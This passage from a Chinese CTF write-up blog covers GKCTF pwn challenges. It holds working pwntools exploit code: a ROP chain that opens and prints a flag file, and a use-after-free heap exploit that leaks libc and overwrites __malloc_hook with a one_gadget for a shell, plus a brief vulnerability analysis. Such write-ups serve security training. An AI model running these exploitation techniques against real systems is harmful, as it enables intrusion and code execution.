+<span class="n">pop_rdx_ret</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;pop rdx</span><span class="se">\n</span><span class="s1">ret&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">next</span><span class="p">()</span>
+<span class="n">open_</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;open&#39;</span><span class="p">]</span>
+<span class="n">read</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span>
+<span class="n">puts</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+<span class="n">flag</span><span class="o">=</span><span class="n">heap</span><span class="o">+</span><span class="mh">0x250</span>
+<span class="n">payload</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">open_</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">flag</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">read</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">flag</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">puts</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x6161616161</span><span class="p">)</span>
+<span class="nb">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">,</span><span class="s1">&#39;5</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">+</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><h1 id="girfriend-simulation">girfriend simulation</h1>
+<h2 id="漏洞分析-1">漏洞分析</h2>
+<p>这道题有趣的地方是可以开启多个线程，每个线程存在UAF漏洞，但是线程的堆块并不arena是释放后就返回堆块的，不想main arena有这些管理机制，因此如果线程的堆块不是在main arena里面的话，我们是无法利用的，需要想办法把它的堆弄到main arena里面去。</p>
+<p>刚好libc的版本是2.23，线程arena是有限的，当线程arena分配完了后，线程就会使用main arena，这个时候我们就达到了目的。</p>
+<p>接下来的任务就是如何去判断线程的堆是否在main arena里面。我们可以先创建一个promise，然后在删除掉，再创建一个promise，这个时候的promise有上一次创建的promise的数据，可以达到泄漏的目的，因此可以依据泄漏的数据来判断是否再main arena中。</p>
+<p>获得再main arena中的线程后，利用就很简单了，不赘诉了。</p>
+<h2 id="exp-1">EXP</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>
+	<span class="n">sh</span><span class="o">=</span><span class="n">remote</span><span class="p">()</span>
+<span class="k">else</span><span class="p">:</span>
+	<span class="n">sh</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;I386&#39;</span><span class="p">]:</span>
+	<span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span>
+<span class="k">else</span><span class="p">:</span>
+	<span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
+
+<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">]:</span>
+	<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
+
+<span class="k">def</span> <span class="nf">choice</span><span class="p">(</span><span class="n">elect</span><span class="p">):</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt;&gt;&#39;</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">elect</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
+	<span class="n">choice</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;size?&#39;</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">show</span><span class="p">():</span>
+	<span class="n">choice</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">delete</span><span class="p">():</span>
+	<span class="n">choice</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mi">9</span><span class="p">))</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+	<span class="n">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
+	<span class="n">delete</span><span class="p">()</span>
+	<span class="n">add</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span><span class="s1">&#39;11111111&#39;</span><span class="p">)</span>
+	<span class="n">show</span><span class="p">()</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;11111111&#39;</span><span class="p">)</span>
+	<span class="n">heap_addr</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+	<span class="nb">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">heap_addr</span><span class="p">)</span>
+	<span class="n">choice</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
+<span class="n">delete</span><span class="p">()</span>
+<span class="n">choice</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;wife:&#39;</span><span class="p">)</span>
+<span class="n">stdout_addr</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x1b</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x1b</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
+<span class="n">libc</span><span class="o">=</span><span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;_IO_2_1_stdout_&#39;</span><span class="p">,</span><span class="n">stdout_addr</span><span class="p">)</span>
+<span class="n">libc_base</span><span class="o">=</span><span class="n">stdout_addr</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;_IO_2_1_stdout_&#39;</span><span class="p">)</span>
+<span class="n">realloc</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;realloc&#39;</span><span class="p">)</span>
+<span class="n">malloc_hook</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;__malloc_hook&#39;</span><span class="p">)</span>
+<span class="n">onegadget</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x4526a</span>
+<span class="nb">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">onegadget</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;impress&#39;</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">malloc_hook</span><span class="o">-</span><span class="mh">0x23</span><span class="p">))</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Questionnaire&#39;</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0xb</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">onegadget</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">realloc</span><span class="o">+</span><span class="mi">4</span><span class="p">))</span>
+<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2020-05-28</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/gkctf-writeup/index.md" target="_blank">阅读原始文档</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="http://example.org/gkctf-writeup/" data-title="GKCTF Writeup" data-via="xx" data-hashtags="pwn,wp"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://example.org/gkctf-writeup/" data-hashtag="pwn"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="分享到 WhatsApp" data-sharer="whatsapp" data-url="http://example.org/gkctf-writeup/" data-title="GKCTF Writeup" data-web><i class="fab fa-whatsapp fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="http://example.org/gkctf-writeup/" data-title="GKCTF Writeup"><i data-svg-src="/lib/simple-icons/icons/line.min.svg"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://example.org/gkctf-writeup/" data-title="GKCTF Writeup"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Myspace" data-sharer="myspace" data-url="http://example.org/gkctf-writeup/" data-title="GKCTF Writeup" data-description=""><i data-svg-src="/lib/simple-icons/icons/myspace.min.svg"></i></a><a href="javascript:void(0);" title="分享到 Blogger" data-sharer="blogger" data-url="http://example.org/gkctf-writeup/" data-title="GKCTF Writeup" data-description=""><i class="fab fa-blogger fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="http://example.org/gkctf-writeup/" data-title="GKCTF Writeup"><i class="fab fa-evernote fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/pwn/">pwn</a>,&nbsp;<a href="/tags/wp/">wp</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACglibc%E7%9A%84%E5%A0%86%E7%AE%A1%E7%90%86%E5%92%8C%E6%96%B0%E5%A2%9E%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" class="prev" rel="prev" title="不同版本glibc的堆管理和新增保护机制"><i class="fas fa-angle-left fa-fw"></i>不同版本glibc的堆管理和新增保护机制</a>
+            <a href="/crakeme160-005-ajj-2/" class="next" rel="next" title="CrakeMe160(005)-ajj.2">CrakeMe160(005)-ajj.2<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Luexp</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
